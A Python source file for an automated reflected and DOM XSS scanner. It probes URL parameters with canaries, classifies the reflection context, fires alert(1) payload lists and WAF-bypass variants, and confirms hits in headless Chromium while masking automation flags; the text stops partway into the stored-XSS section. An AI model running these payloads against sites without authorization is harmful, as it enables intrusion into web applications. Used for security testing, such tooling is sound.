#!/usr/bin/env python3
"""
xss_detector.py  —  JS Scout XSS Engine v8
============================================
Browser-FIRST XSS detection using Selenium + Chromium as the primary
confirmation engine. Every result you see has been verified by a real
browser executing the payload — not just HTTP pattern matching.

Pipeline per parameter
──────────────────────
  1. CANARY      Send a unique alphanumeric marker; skip param if not reflected
  2. CONTEXT     Inspect exactly where in the HTML/JS the marker lands
                 (html body / attribute DQ / attribute SQ / href / src /
                  JS double-quote string / JS single-quote string /
                  JS template literal / URL context)
  3. PAYLOADS    Pick the right payload list for that context
                 (+ WAF bypass variants if primary payloads fail)
  4. HTTP-CHECK  Quick sanity: is the dangerous part present unescaped?
  5. BROWSER     Load the PoC URL in headless Chromium; wait for alert()
  6. SCREENSHOT  Capture screen on every browser-confirmed hit
  7. REPORT      Per-parameter table:
                   param | context | payload that worked | PoC URL |
                   browser confirmed? | alert text | screenshot path

Usage
─────
  python3 xss_detector.py https://target.com/search
  python3 xss_detector.py "https://target.com/page?q=test&lang=en"
  python3 xss_detector.py https://target.com --params q,search,name,id
  python3 xss_detector.py https://target.com --cookies "session=abc123"
  python3 xss_detector.py https://target.com --no-browser --params q,id
  python3 xss_detector.py https://target.com --js-dir ./js/
"""

import re, sys, os, json, time, threading, hashlib, argparse
from pathlib import Path
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, quote
from concurrent.futures import ThreadPoolExecutor, wait as cf_wait
from html.parser import HTMLParser
from collections import defaultdict

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] pip install requests"); sys.exit(1)

SELENIUM_OK = False
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import (
        TimeoutException, WebDriverException,
        UnexpectedAlertPresentException, NoAlertPresentException,
    )
    SELENIUM_OK = True
except ImportError:
    pass

WDM_OK = False
try:
    from webdriver_manager.chrome import ChromeDriverManager
    WDM_OK = True
except ImportError:
    pass


# =============================================================================
# PAYLOAD LIBRARY  — context-keyed, ordered best-first
# Each entry: (payload_string, short_label)
# =============================================================================

PAYLOADS = {

    # Reflected into raw HTML body
    'html': [
        ('<img src=x onerror=alert(1)>',               'img onerror'),
        ('<svg onload=alert(1)>',                       'svg onload'),
        ('<details open ontoggle=alert(1)>',            'details toggle'),
        ('<input autofocus onfocus=alert(1)>',          'input autofocus'),
        ('<script>alert(1)</script>',                   'script tag'),
        ('<body onload=alert(1)>',                      'body onload'),
        ('<iframe src=javascript:alert(1)>',            'iframe js:'),
        ('<video><source onerror=alert(1)>',            'video source'),
        ('<object data=javascript:alert(1)>',           'object data'),
        ('<marquee onstart=alert(1)>',                  'marquee start'),
        ('<audio src onerror=alert(1)>',                'audio onerror'),
    ],

    # Inside double-quoted attribute  value="HERE"
    'attr_dq': [
        ('" onmouseover=alert(1) x="',                 'break dq onmouseover'),
        ('" autofocus onfocus=alert(1) x="',           'break dq onfocus'),
        ('" onclick=alert(1) x="',                     'break dq onclick'),
        ('" onpointerover=alert(1) x="',               'break dq onpointerover'),
        ('"><img src=x onerror=alert(1)>',             'break dq close+img'),
        ('"><svg onload=alert(1)>',                    'break dq close+svg'),
        ('" onanimationstart=alert(1) style="animation-name:x" x="', 'animation'),
    ],

    # Inside single-quoted attribute  value='HERE'
    'attr_sq': [
        ("' onmouseover=alert(1) x='",                 'break sq onmouseover'),
        ("' autofocus onfocus=alert(1) x='",           'break sq onfocus'),
        ("' onclick=alert(1) x='",                     'break sq onclick'),
        ("'><img src=x onerror=alert(1)>",             'break sq close+img'),
        ("'><svg onload=alert(1)>",                    'break sq close+svg'),
    ],

    # href / action / formaction attribute
    'attr_href': [
        ('javascript:alert(1)',                        'js: direct'),
        ('javascript:alert`1`',                        'js: template'),
        ('JaVaScRiPt:alert(1)',                        'js: case bypass'),
        ('\tjavascript:alert(1)',                      'js: tab prefix'),
        ('&#106;avascript:alert(1)',                   'js: entity j'),
        ('data:text/html,<script>alert(1)</script>',   'data: uri'),
    ],

    # src / data / background attribute
    'attr_src': [
        ('x onerror=alert(1)',                         'src onerror bare'),
        ('x" onerror="alert(1)',                       'src onerror dq'),
        ("x' onerror='alert(1)",                       'src onerror sq'),
        ('https://x/x onerror=alert(1)',               'src url onerror'),
    ],

    # JS double-quoted string  var x = "HERE";
    'js_str_dq': [
        ('";alert(1)//',                               'dq break comment'),
        ('"-alert(1)-"',                               'dq subtract'),
        ('"+(alert(1))+"',                             'dq concat'),
        ('\\";alert(1)//',                             'dq backslash break'),
        ('</script><script>alert(1)</script>',         'dq close script'),
        ('";alert(1);x="',                             'dq break assign'),
    ],

    # JS single-quoted string  var x = 'HERE';
    'js_str_sq': [
        ("';alert(1)//",                               'sq break comment'),
        ("'-alert(1)-'",                               'sq subtract'),
        ("'+(alert(1))+'",                             'sq concat'),
        ("\\'-(alert(1))-\\'",                         'sq backslash sub'),
        ("</script><script>alert(1)</script>",         'sq close script'),
        ("';alert(1);x='",                             'sq break assign'),
    ],

    # JS template literal  var x = `HERE`;
    'js_str_bt': [
        ('${alert(1)}',                                'template interpolate'),
        ('`;alert(1)//',                               'template break'),
        ('`-alert(1)-`',                               'template subtract'),
    ],

    # JS comment
    'js_comment': [
        ('\nalert(1)//',                               'newline escape'),
        ('*/alert(1)//',                               'block close'),
    ],

    # URL value
    'url': [
        ('javascript:alert(1)',                        'url js:'),
        ('"><img src=x onerror=alert(1)>',             'url break tag'),
        ('%22><img src=x onerror=alert(1)>',           'url encoded break'),
        ("'><svg onload=alert(1)>",                    'url sq break'),
    ],

    # Unknown / mixed
    'unknown': [
        ('<img src=x onerror=alert(1)>',               'img onerror'),
        ('<svg onload=alert(1)>',                      'svg onload'),
        ('"><img src=x onerror=alert(1)>',             'attr dq break'),
        ("'><svg onload=alert(1)>",                    'attr sq break'),
        ('";alert(1)//',                               'js dq break'),
        ("';alert(1)//",                               'js sq break'),
        ('javascript:alert(1)',                        'js: href'),
        ('${alert(1)}',                                'template inject'),
        ('<script>alert(1)</script>',                  'script tag'),
        ('<details open ontoggle=alert(1)>',           'details toggle'),
    ],
}

# WAF / encoding bypass payloads — tried after all context payloads fail
WAF_BYPASS = [
    ('<img/src=x/onerror=alert(1)>',                   'img slash'),
    ('<svg/onload=alert(1)//>',                        'svg slash'),
    ('<sCrIpT>alert(1)</sCrIpT>',                      'case mix'),
    ('<IMG SRC=x ONERROR=alert(1)>',                   'uppercase'),
    ('<img src=x onerror=alert`1`>',                   'template call'),
    ('<svg><script>alert(1)</script>',                 'svg+script'),
    ('<iframe onload=alert(1) src=x>',                 'iframe onload'),
    ('<svg><animate onbegin=alert(1) attributeName=x>','animate onbegin'),
    ('<xss id=x tabindex=1 onfocus=alert(1)></xss>#x', 'tabindex focus'),
    ('%3cimg+src%3dx+onerror%3dalert(1)%3e',           'full url-encode'),
    ('<img src="x`<script>alert(1)</script>"` `>',     'backtick polyglot'),
    ('&#60;img src=x onerror=alert(1)&#62;',           'html entity'),
    ('<img src=x onerror="&#97;lert(1)">',             'entity in handler'),
    ('<svg onload="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">',
                                                       'fromCharCode'),
]

CANARY_PREFIX = 'XSSc4n4ry'


# =============================================================================
# CONTEXT CLASSIFIER
# =============================================================================

def classify_reflection_context(html: str, marker: str) -> list:
    """
    Find every position where *marker* appears and return a list of context
    dicts — one per unique context type.

    Each dict has:
      context      — one of the PAYLOADS keys
      surrounding  — 120 chars either side of the reflection (for report)
      tag          — HTML tag name if inside a tag
      attr         — attribute name if inside an attribute value
      quote_char   — quote style: '"', "'", or ''
    """
    contexts = []
    pos = 0
    while True:
        idx = html.find(marker, pos)
        if idx == -1:
            break
        pos = idx + 1

        before = html[max(0, idx - 600): idx]
        after  = html[idx: min(len(html), idx + 300)]
        surr   = html[max(0, idx - 120): idx + 120]

        info = _classify_context(before, after)
        info['surrounding'] = surr

        if not any(c['context'] == info['context'] for c in contexts):
            contexts.append(info)

    return contexts or [{
        'context': 'unknown', 'surrounding': '',
        'tag': '', 'attr': '', 'quote_char': ''
    }]


def _classify_context(before: str, after: str) -> dict:
    b    = before.lower()
    base = {'tag': '', 'attr': '', 'quote_char': ''}

    # 1. Inside <script> block
    last_open  = b.rfind('<script')
    last_close = b.rfind('</script')
    if last_open > last_close and last_open != -1:
        code      = before[last_open:]
        last_line = code.split('\n')[-1]

        # Single-line comment
        if '//' in last_line and not last_line.strip().startswith('//'):
            return {**base, 'context': 'js_comment'}

        # Block comment
        if code.count('/*') > code.count('*/'):
            return {**base, 'context': 'js_comment'}

        def _ue(s, ch):
            return len(re.findall(r'(?<!\\)' + re.escape(ch), s))

        dq = _ue(code, '"')
        sq = _ue(code, "'")
        bt = _ue(code, '`')

        if dq % 2 == 1: return {**base, 'context': 'js_str_dq', 'quote_char': '"'}
        if sq % 2 == 1: return {**base, 'context': 'js_str_sq', 'quote_char': "'"}
        if bt % 2 == 1: return {**base, 'context': 'js_str_bt', 'quote_char': '`'}
        return {**base, 'context': 'js_str_dq', 'quote_char': '"'}

    # 2. Inside HTML tag
    last_lt = before.rfind('<')
    last_gt = before.rfind('>')
    if last_lt > last_gt and last_lt != -1:
        tag_chunk = before[last_lt:]
        tag_m     = re.match(r'<([a-zA-Z][a-zA-Z0-9]*)', tag_chunk)
        tag_name  = tag_m.group(1).lower() if tag_m else ''

        attr_name  = ''
        quote_char = '"'
        m = re.search(r'([\w\-]+)\s*=\s*(["\']?)([^>]*)$', tag_chunk)
        if m:
            attr_name  = m.group(1).lower()
            quote_char = m.group(2) or '"'

        if attr_name in ('href', 'action', 'formaction', 'ping', 'xlink:href'):
            return {**base, 'context': 'attr_href',
                    'tag': tag_name, 'attr': attr_name, 'quote_char': quote_char}
        if attr_name in ('src', 'data', 'background', 'lowsrc', 'poster'):
            return {**base, 'context': 'attr_src',
                    'tag': tag_name, 'attr': attr_name, 'quote_char': quote_char}

        if quote_char == "'":
            return {**base, 'context': 'attr_sq',
                    'tag': tag_name, 'attr': attr_name, 'quote_char': "'"}
        return {**base, 'context': 'attr_dq',
                'tag': tag_name, 'attr': attr_name, 'quote_char': '"'}

    # 3. URL-adjacent context
    if any(h in b[-200:] for h in ['href=', 'src=', 'action=', 'url=',
                                     'redirect=', 'next=', 'location=']):
        return {**base, 'context': 'url'}

    # 4. Raw HTML body
    return {**base, 'context': 'html'}


# =============================================================================
# CHROMIUM BROWSER ENGINE
# =============================================================================

class XSSBrowser:
    """
    Single headless Chromium instance.  All public methods are thread-safe
    (calls are serialised via a lock).
    """

    def __init__(self, timeout: int = 14, screenshot_dir: Path = None,
                 log_fn=None):
        self.timeout        = timeout
        self.screenshot_dir = Path(screenshot_dir) if screenshot_dir else None
        self.log            = log_fn or print
        self.driver         = None
        self._lock          = threading.Lock()

    def start(self) -> bool:
        if not SELENIUM_OK:
            self.log("[!] Selenium not installed — pip install selenium webdriver-manager")
            return False

        opts = ChromeOptions()
        opts.add_argument('--headless=new')
        opts.add_argument('--no-sandbox')
        opts.add_argument('--disable-dev-shm-usage')
        opts.add_argument('--disable-gpu')
        opts.add_argument('--disable-web-security')
        opts.add_argument('--allow-running-insecure-content')
        opts.add_argument('--ignore-certificate-errors')
        opts.add_argument('--window-size=1280,900')
        opts.add_argument('--disable-blink-features=AutomationControlled')
        opts.add_argument(
            '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
            'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
        )
        opts.add_experimental_option('excludeSwitches', ['enable-automation'])
        opts.add_experimental_option('useAutomationExtension', False)

        errs = []

        for attempt_fn in [
            lambda: webdriver.Chrome(service=ChromeService(), options=opts),
            lambda: (webdriver.Chrome(
                service=ChromeService(ChromeDriverManager().install()),
                options=opts) if WDM_OK else (_ for _ in ()).throw(RuntimeError('no wdm'))),
        ] + [
            (lambda p: lambda: webdriver.Chrome(
                service=ChromeService(p), options=opts))(p)
            for p in ['/usr/bin/chromedriver', '/usr/local/bin/chromedriver',
                      '/snap/bin/chromium.chromedriver']
            if os.path.exists(p)
        ]:
            try:
                self.driver = attempt_fn()
                self.log("[+] XSS Browser: Chromium started")
                return True
            except Exception as e:
                errs.append(str(e))

        self.log("[!] Could not start Chromium:")
        for e in errs[-3:]:
            self.log(f"    {e[:110]}")
        self.log("    Fix: apt install chromium chromium-driver")
        return False

    def stop(self):
        if self.driver:
            try:   self.driver.quit()
            except Exception: pass
            self.driver = None

    def test_url(self, url: str, param: str, payload: str,
                 wait_alert: float = 5.0) -> dict:
        """
        Load *url* in Chromium and check whether alert() fires.

        Returns dict with keys:
          fired       — alert dialog actually appeared (bool)
          alert_text  — text inside the dialog (str)
          in_dom      — dangerous unescaped content in rendered DOM (bool)
          screenshot  — absolute path to PNG, '' if none (str)
          page_source — first 4 KB of rendered HTML (str)
        """
        result = {
            'fired': False, 'alert_text': '',
            'in_dom': False, 'screenshot': '', 'page_source': '',
        }
        if not self.driver:
            return result

        with self._lock:
            try:
                self.driver.set_page_load_timeout(self.timeout)

                # Dismiss any leftover dialog
                try:
                    self.driver.switch_to.alert.dismiss()
                except Exception:
                    pass

                # Navigate — alert may fire during page load
                try:
                    self.driver.get(url)
                except UnexpectedAlertPresentException:
                    try:
                        alert = self.driver.switch_to.alert
                        result['fired']      = True
                        result['alert_text'] = alert.text
                        result['screenshot'] = self._screenshot(param, payload)
                        alert.accept()
                    except Exception:
                        pass
                    return result
                except TimeoutException:
                    pass   # page may still have alert
                except WebDriverException as e:
                    if 'net::ERR' in str(e):
                        return result

                # Explicit wait for alert after page load
                try:
                    WebDriverWait(self.driver, wait_alert).until(EC.alert_is_present())
                    alert = self.driver.switch_to.alert
                    result['fired']      = True
                    result['alert_text'] = alert.text
                    result['screenshot'] = self._screenshot(param, payload)
                    alert.accept()
                except (TimeoutException, NoAlertPresentException):
                    pass

                # DOM check (even if no alert — for in_dom flag)
                if not result['fired']:
                    try:
                        src = self.driver.page_source
                        result['page_source'] = src[:4000]
                        danger = ['onerror=', 'onload=', 'onfocus=', 'onmouseover=',
                                  'onclick=', 'ontoggle=', '<script>',
                                  'javascript:alert', 'onerror=alert', 'onload=alert']
                        result['in_dom'] = any(d in src.lower() for d in danger)
                    except Exception:
                        pass

            except WebDriverException as e:
                if 'net::ERR' not in str(e):
                    self.log(f"  [browser] {str(e)[:100]}")
            except Exception:
                pass

        return result

    def test_dom_via_hash(self, base_url: str, hash_payload: str,
                          wait_alert: float = 4.0) -> dict:
        """Navigate to base_url then inject hash_payload via window.location.hash."""
        result = {'fired': False, 'alert_text': '', 'screenshot': ''}
        if not self.driver:
            return result

        with self._lock:
            try:
                self.driver.set_page_load_timeout(self.timeout)
                try: self.driver.switch_to.alert.dismiss()
                except Exception: pass

                self.driver.get(base_url)
                time.sleep(0.8)
                self.driver.execute_script(
                    f"window.location.hash = {json.dumps(hash_payload)}")

                try:
                    WebDriverWait(self.driver, wait_alert).until(EC.alert_is_present())
                    alert = self.driver.switch_to.alert
                    result['fired']      = True
                    result['alert_text'] = alert.text
                    result['screenshot'] = self._screenshot('dom_hash', hash_payload)
                    alert.accept()
                except TimeoutException:
                    pass
            except Exception:
                pass
        return result

    def _screenshot(self, param: str, payload: str) -> str:
        if not self.screenshot_dir:
            return ''
        try:
            self.screenshot_dir.mkdir(parents=True, exist_ok=True)
            slug  = re.sub(r'[^a-zA-Z0-9_]', '_', str(param))[:20]
            h     = hashlib.md5(f"{param}{payload}".encode()).hexdigest()[:8]
            fname = self.screenshot_dir / f"xss_{slug}_{h}.png"
            self.driver.save_screenshot(str(fname))
            return str(fname.resolve())
        except Exception:
            return ''


# =============================================================================
# DOM XSS STATIC ANALYZER
# =============================================================================

DOM_SINKS = [
    (re.compile(r'createContextualFragment\s*\(',          re.I), 'createContextualFragment', 'CRITICAL'),
    (re.compile(r'(?<!\.)(?<!typeof\s)\beval\s*\(',        re.I), 'eval()',                   'CRITICAL'),
    (re.compile(r'\bnew\s+Function\s*\(',                  re.I), 'new Function()',            'CRITICAL'),
    (re.compile(r'\.insertAdjacentHTML\s*\(',              re.I), 'insertAdjacentHTML()',      'CRITICAL'),
    (re.compile(r'dangerouslySetInnerHTML\s*=',            re.I), 'dangerouslySetInnerHTML',   'CRITICAL'),
    (re.compile(r'\.srcdoc\s*=',                           re.I), 'iframe.srcdoc',             'CRITICAL'),
    (re.compile(r'\.innerHTML\s*=',                        re.I), 'innerHTML=',                'HIGH'),
    (re.compile(r'\.outerHTML\s*=',                        re.I), 'outerHTML=',                'HIGH'),
    (re.compile(r'document\.write\s*\(',                   re.I), 'document.write()',          'HIGH'),
    (re.compile(r'document\.writeln\s*\(',                 re.I), 'document.writeln()',        'HIGH'),
    (re.compile(r'setTimeout\s*\(\s*(?:["\']|[a-zA-Z_$][a-zA-Z0-9_$]*\s*\+)', re.I),
                                                                   'setTimeout(string)',        'HIGH'),
    (re.compile(r'setInterval\s*\(\s*(?:["\']|[a-zA-Z_$][a-zA-Z0-9_$]*\s*\+)', re.I),
                                                                   'setInterval(string)',       'HIGH'),
    (re.compile(r'location\.(?:replace|assign)\s*\(',     re.I), 'location.replace/assign',   'HIGH'),
    (re.compile(r'window\.location\s*=',                   re.I), 'window.location=',          'HIGH'),
    (re.compile(r'\.setAttribute\s*\(\s*["\'](?:href|src|action|onload|onerror)["\']', re.I),
                                                                   'setAttribute(event/url)',   'HIGH'),
    (re.compile(r'\$\([^)]+\)\.html\s*\([^)]+\)',         re.I), 'jQuery.html(val)',           'HIGH'),
    (re.compile(r'\.attr\s*\(\s*["\'](?:href|src)["\']',  re.I), 'jQuery.attr(href/src)',     'HIGH'),
    (re.compile(r'\$\([^)]+\)\.(?:append|prepend|after|before)\s*\(\s*[^"\'`)]', re.I),
                                                                   'jQuery.append/prepend',     'MEDIUM'),
    (re.compile(r'addEventListener\s*\(\s*["\']message["\']', re.I), 'postMessage listener',   'MEDIUM'),
]

DOM_SOURCES = [
    (re.compile(r'location\.(?:search|hash|href|pathname)', re.I), 'location.*'),
    (re.compile(r'document\.(?:URL|documentURI|referrer)',  re.I), 'document.URL/referrer'),
    (re.compile(r'URLSearchParams|searchParams\.get',       re.I), 'URLSearchParams'),
    (re.compile(r'document\.getElementById\([^)]+\)\.value', re.I),'DOM input value'),
    (re.compile(r'document\.querySelector\([^)]+\)\.value', re.I), 'querySelector value'),
    (re.compile(r'window\.name',                            re.I), 'window.name'),
    (re.compile(r'document\.cookie',                        re.I), 'document.cookie'),
    (re.compile(r'\.hash\b',                                re.I), 'URL hash'),
]

SANITIZERS = [
    'DOMPurify', 'sanitizeHtml', 'escapeHtml', 'htmlspecialchars',
    'createTextNode', 'encodeURIComponent', 'xss(', 'filterXSS',
    'bleach.clean', 'he.encode', 'innerText', 'textContent',
]

SINK_PAYLOADS = {
    'innerHTML=':            '<img src=x onerror=alert(1)>',
    'outerHTML=':            '<img src=x onerror=alert(1)>',
    'insertAdjacentHTML()':  '<img src=x onerror=alert(1)>',
    'document.write()':      '<img src=x onerror=alert(1)>',
    'document.writeln()':    '<img src=x onerror=alert(1)>',
    'createContextualFragment': '<img src=x onerror=alert(1)>',
    'dangerouslySetInnerHTML': '{__html: "<img src=x onerror=alert(1)>"}',
    'eval()':                'alert(1)',
    'new Function()':        '"alert(1)"',
    'setTimeout(string)':    '"alert(1)"',
    'setInterval(string)':   '"alert(1)"',
    'location.replace/assign': 'javascript:alert(1)',
    'window.location=':      'javascript:alert(1)',
    'setAttribute(event/url)': 'javascript:alert(1)',
    'jQuery.attr(href/src)': 'javascript:alert(1)',
    'jQuery.html(val)':      '<img src=x onerror=alert(1)>',
    'jQuery.append/prepend': '<img src=x onerror=alert(1)>',
    'iframe.srcdoc':         '<script>alert(1)</script>',
    'postMessage listener':  '{"type":"xss","data":"<img src=x onerror=alert(1)>"}',
}


class DOMXSSAnalyzer:
    def analyze(self, js_content: str, filename: str) -> list:
        findings = []
        seen     = set()
        lines    = js_content.split('\n')

        for sink_pat, sink_name, severity in DOM_SINKS:
            for m in sink_pat.finditer(js_content):
                line_no = js_content[:m.start()].count('\n') + 1
                line    = lines[line_no - 1].strip()[:300] if line_no <= len(lines) else ''
                nearby  = js_content[max(0, m.start()-500): m.end()+500]

                if self._is_fp(m.group(0), line, nearby, sink_name):
                    continue

                key = f'{sink_name}:{line_no}:{filename}'
                if key in seen:
                    continue
                seen.add(key)

                sources   = [n for p, n in DOM_SOURCES if p.search(nearby)]
                sanitized = [s for s in SANITIZERS if s in nearby]
                confirmed = bool(sources) and not bool(sanitized)

                findings.append({
                    'file':              filename,
                    'type':              'DOM_XSS',
                    'sink':              sink_name,
                    'severity':          severity,
                    'line':              line_no,
                    'context':           line[:250],
                    'match':             m.group(0)[:150],
                    'confirmed_flow':    confirmed,
                    'sources':           sources,
                    'sanitizers_nearby': sanitized,
                    'suggested_payload': SINK_PAYLOADS.get(sink_name,
                                         '<img src=x onerror=alert(1)>'),
                })
        return findings

    def _is_fp(self, match, line, nearby, sink):
        ci = line.find('//')
        mi = line.find(match[:20])
        if ci != -1 and mi != -1 and mi > ci:
            return True
        if nearby.count('/*') > nearby.count('*/'):
            return True
        if any(s in nearby for s in SANITIZERS):
            return True
        if 'innerHTML' in sink and re.search(r'innerHTML\s*=\s*["\']', line):
            return True
        if 'eval' in sink and 'typeof' in line:
            return True
        return False


# =============================================================================
# PARAMETER DISCOVERY
# =============================================================================

class ParamDiscovery(HTMLParser):
    """Scan a page and collect parameter names from links, forms, data-attrs."""

    def __init__(self, base_url: str):
        super().__init__(convert_charrefs=True)
        self.base_url    = base_url
        self.base_domain = urlparse(base_url).netloc
        self.params      = defaultdict(set)
        self.forms       = []
        self._cur_form   = None

    def handle_starttag(self, tag, attrs):
        a = {k.lower(): (v or '') for k, v in attrs}

        if tag == 'form':
            action = urljoin(self.base_url, a.get('action', '') or self.base_url)
            self._cur_form = {
                'action':  action,
                'method':  a.get('method', 'GET').upper(),
                'fields':  [],
                'enctype': a.get('enctype', 'application/x-www-form-urlencoded'),
            }

        elif tag in ('input', 'textarea', 'select') and self._cur_form:
            name  = a.get('name', '').strip()
            ftype = a.get('type', 'text').lower()
            val   = a.get('value', '')
            if name and ftype not in ('submit','reset','image','button','hidden','file'):
                self._cur_form['fields'].append(
                    {'name': name, 'type': ftype, 'value': val})

        elif tag == 'a':
            href = a.get('href', '').strip()
            if href and not href.startswith(('javascript:','mailto:','#','data:')):
                try:
                    full   = urljoin(self.base_url, href)
                    parsed = urlparse(full)
                    if parsed.netloc == self.base_domain or not parsed.netloc:
                        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        for p in parse_qs(parsed.query).keys():
                            self.params[base].add(p)
                except Exception:
                    pass

        # data-url / data-href attributes
        for attr_name, attr_val in a.items():
            if attr_name.startswith('data-') and attr_val and '?' in attr_val:
                try:
                    parsed = urlparse(urljoin(self.base_url, attr_val))
                    base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    for p in parse_qs(parsed.query).keys():
                        self.params[base].add(p)
                except Exception:
                    pass

    def handle_endtag(self, tag):
        if tag == 'form' and self._cur_form:
            self.forms.append(self._cur_form)
            base = self._cur_form['action'].split('?')[0]
            for f in self._cur_form['fields']:
                self.params[base].add(f['name'])
            self._cur_form = None

    def get_js_params(self, html: str) -> set:
        """Extract param names from inline JS patterns."""
        found = set()
        for pat in [
            r'getParam(?:eter)?\s*\(\s*["\'](\w+)["\']',
            r'searchParams\.get\s*\(\s*["\'](\w+)["\']',
            r'params\[["\'](\w+)["\']\]',
            r'query\[["\']([\w_]+)["\']\]',
            r'req\.query\.([\w_]+)',
            r'\$_GET\[["\'](\w+)["\']\]',
        ]:
            for m in re.finditer(pat, html, re.I):
                found.add(m.group(1))
        return found


# =============================================================================
# REFLECTED XSS PROBER
# =============================================================================

class ReflectedXSSProber:
    """
    Per-parameter reflected XSS detection.

    For each (base_url, param):
      1. Send canary — skip if not reflected
      2. Classify reflection context
      3. HTTP pre-check per payload (is dangerous part present unescaped?)
      4. Browser confirmation (alert() fires in Chromium?)
      5. If all context payloads filtered → try WAF bypass payloads
      6. Record exact param, context, payload, PoC URL, screenshot
    """

    def __init__(self, session: requests.Session, browser: 'XSSBrowser' = None,
                 timeout: int = 8, log_fn=None):
        self.session = session
        self.browser = browser
        self.timeout = min(timeout, 10)
        self.log     = log_fn or print

    def probe(self, base_url: str, param: str,
              existing_params: dict = None) -> list:
        findings  = []
        existing  = existing_params or {}

        # Unique canary per (url, param) so we never confuse reflections
        canary = (CANARY_PREFIX
                  + hashlib.md5(f'{base_url}:{param}'.encode()).hexdigest()[:8])

        # 1. Canary check
        canary_url = f"{base_url}?{urlencode({**existing, param: canary})}"
        try:
            cr = self.session.get(canary_url, timeout=self.timeout,
                                   allow_redirects=True)
            if cr.status_code >= 400 or canary not in cr.text:
                return []
            canary_html = cr.text
        except Exception:
            return []

        # 2. Context classification
        ctx_list  = classify_reflection_context(canary_html, canary)
        ctx_names = [c['context'] for c in ctx_list]
        self.log(f"  [canary+] REFLECTED  {base_url}  "
                 f"param={param}  ctx={'|'.join(ctx_names)}")

        seen_ctx     = set()
        tried_bypass = False

        for ctx_info in ctx_list:
            ctx = ctx_info['context']
            if ctx in seen_ctx:
                continue
            seen_ctx.add(ctx)

            # 3. Payload list for this context
            payloads = list(PAYLOADS.get(ctx, PAYLOADS['unknown']))
            if ctx == 'attr_dq':
                payloads += PAYLOADS.get('attr_sq', [])
            elif ctx == 'attr_sq':
                payloads += PAYLOADS.get('attr_dq', [])

            found_in_ctx = False

            for payload_str, payload_label in payloads:
                f = self._try_payload(base_url, param, payload_str, payload_label,
                                      ctx, ctx_info, existing)
                if f:
                    findings.append(f)
                    found_in_ctx = True
                    if f.get('browser_confirmed'):
                        break   # confirmed — no need for more payloads in this ctx

            # 4. WAF bypass pass
            if not found_in_ctx and not tried_bypass:
                tried_bypass = True
                self.log(f"  [bypass] Testing WAF bypass payloads for param={param}...")
                for payload_str, payload_label in WAF_BYPASS:
                    f = self._try_payload(base_url, param, payload_str,
                                          f'WAF:{payload_label}', ctx,
                                          ctx_info, existing)
                    if f:
                        findings.append(f)
                        if f.get('browser_confirmed'):
                            break

        return findings

    def _try_payload(self, base_url, param, payload_str, payload_label,
                     ctx, ctx_info, existing):
        test_url = f"{base_url}?{urlencode({**existing, param: payload_str})}"

        # HTTP pre-check
        try:
            resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)
            if not self._payload_unescaped(payload_str, resp.text):
                return None
        except Exception:
            return None

        # Browser confirmation
        browser_confirmed = False
        in_dom            = False
        screenshot        = ''
        alert_text        = ''

        if self.browser and self.browser.driver:
            br = self.browser.test_url(test_url, param, payload_str)
            browser_confirmed = br['fired']
            in_dom            = br.get('in_dom', False)
            screenshot        = br.get('screenshot', '')
            alert_text        = br.get('alert_text', '')

        severity = 'CRITICAL' if browser_confirmed else 'HIGH'
        evidence = self._extract_evidence(resp.text, payload_str)

        # Live log
        icon = ('✅ BROWSER CONFIRMED' if browser_confirmed else
                '⚠  IN DOM (unconfirmed)' if in_dom else
                '⚠  HTTP-reflected')
        self.log(f"\n  {'▓'*62}")
        self.log(f"  {icon}")
        self.log(f"  Parameter   : {param}")
        self.log(f"  Context     : {ctx}  [{payload_label}]")
        self.log(f"  Payload     : {payload_str[:120]}")
        self.log(f"  PoC URL     : {test_url[:220]}")
        if screenshot: self.log(f"  Screenshot  : {screenshot}")
        if alert_text: self.log(f"  Alert text  : {alert_text}")
        self.log(f"  {'▓'*62}\n")

        return {
            'type':              'REFLECTED_XSS',
            'severity':          severity,
            'confirmed':         browser_confirmed,
            'url':               test_url,
            'poc_url':           test_url,
            'base_url':          base_url,
            'param':             param,
            'context':           ctx,
            'context_tag':       ctx_info.get('tag', ''),
            'context_attr':      ctx_info.get('attr', ''),
            'context_quote':     ctx_info.get('quote_char', ''),
            'context_snippet':   ctx_info.get('surrounding', '')[:250],
            'payload':           payload_str,
            'payload_label':     payload_label,
            'status_code':       resp.status_code,
            'browser_confirmed': browser_confirmed,
            'in_dom':            in_dom,
            'alert_text':        alert_text,
            'screenshot':        screenshot,
            'evidence':          evidence,
            'description':       (
                f'Reflected XSS in parameter "{param}" '
                f'[context: {ctx}] [{payload_label}]'),
            'remediation': (
                'HTML-encode output in HTML context, JS-escape in JS context, '
                'URL-encode in URL context. '
                'Deploy a strict Content-Security-Policy.'),
        }

    def _payload_unescaped(self, payload: str, body: str) -> bool:
        """Return True if a dangerous part of the payload is in body unescaped."""
        markers = [
            'onerror=', 'onload=', 'onfocus=', 'onmouseover=', 'onclick=',
            'ontoggle=', 'onpointerover=', 'onanimationstart=',
            '<img', '<svg', '<script', '<iframe', '<details', '<audio',
            '<video', '<input', 'javascript:', 'alert(', 'alert`',
        ]
        pl = payload.lower()
        bl = body.lower()
        present = [m for m in markers if m in pl and m in bl]

        if not present:
            return payload[:25] in body

        for m in present:
            idx = bl.find(m)
            while idx != -1:
                pre = body[max(0, idx - 6): idx].lower()
                if '&lt;' not in pre and '%3c' not in pre and '\\u003c' not in pre:
                    return True
                idx = bl.find(m, idx + 1)
        return False

    def _extract_evidence(self, body: str, payload: str) -> str:
        for c in [payload, payload[:25]] + [p.strip() for p in payload.split('=') if len(p.strip()) > 4]:
            idx = body.find(c)
            if idx != -1:
                return body[max(0, idx - 100): idx + 300].strip()[:400]
        return ''


# =============================================================================
# STORED XSS PROBER
# =============================================================================

class StoredXSSProber:
    MARKER = 'XSSst0r3d9z'

    STORE_PAYLOADS = [
